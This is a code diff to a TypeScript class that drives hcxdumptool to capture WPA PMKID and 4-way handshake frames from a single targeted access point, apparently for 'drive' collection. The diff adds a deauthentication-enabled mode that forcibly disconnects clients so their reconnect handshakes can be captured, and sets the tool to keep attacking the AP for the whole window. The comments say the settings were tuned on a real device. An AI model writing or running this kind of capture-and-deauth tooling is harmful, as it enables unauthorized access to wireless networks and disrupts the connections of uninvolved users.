@@ -146,11 +146,26 @@ export class PmkidDriveRunner extends EventEmitter {
   //   -w file        : pcapng with the RSN IE PMKID request/response frames
   //   -c <N>a        : lock to the target channel ("a" = 2GHz band suffix)
   //   --bpf=<file>   : only this AP's frames (writeBpfForAp wrote it)
-  //   --exitoneapol  : bitmask 1|2 — exit as soon as PMKID or EAPOL M2M3
+  //   --attemptapmax : keep requesting the PMKID for the whole window
+  //                    (default 4 BEACONs ≈ 2s is way too short — the AP
+  //                    needs several beacons before it answers the RSN IE
+  //                    PMKID request; verified on the device: 25s windows
+  //                    produced 11-frame dumps with the default)
   //   --tot=<min>    : hard exit timer (ceil of the window, min 1 minute)
   //   --errormax=200 : tolerate malformed frames on a busy channel
   //   --rds=1        : status lines to stderr (parsed for [PMKID...] hits)
   start(): void {
+    this.launch(true);
+  }
+
+  // Deauth-enabled variant: the SAME single-AP window, but WITHOUT
+  // --exitoneapol (so it keeps capturing the full 4-way after the client
+  // reconnects) — hcxdumptool's built-in directed deauths do the forcing.
+  startWithDeauth(): void {
+    this.launch(false);
+  }
+
+  private launch(exitOnEapol: boolean): void {
     if (this.running) return;
     this.running = true;
     const args = [
@@ -159,11 +174,14 @@ export class PmkidDriveRunner extends EventEmitter {
       "-w", this.pcapngPath,
       "-c", `${this.channel}a`,
       "--bpf", this.bpfFile,
-      "--exitoneapol", "3",
+      "--attemptapmax", "0", // keep attacking this AP for the whole window
+    ];
+    if (exitOnEapol) args.push("--exitoneapol", "3");
+    args.push(
       "--tot", String(Math.max(1, Math.ceil(this.windowMs / 60_000))),
       "--errormax", "200",
       "--rds=1",
-    ];
+    );
     this.proc = spawn(args[0], args.slice(1), { detached: true, stdio: ["ignore", "ignore", "pipe"] });
     this.proc.stderr?.on("data", (chunk: Buffer) => this.onStderr(chunk));
     this.proc.on("exit", (code, signal) => {
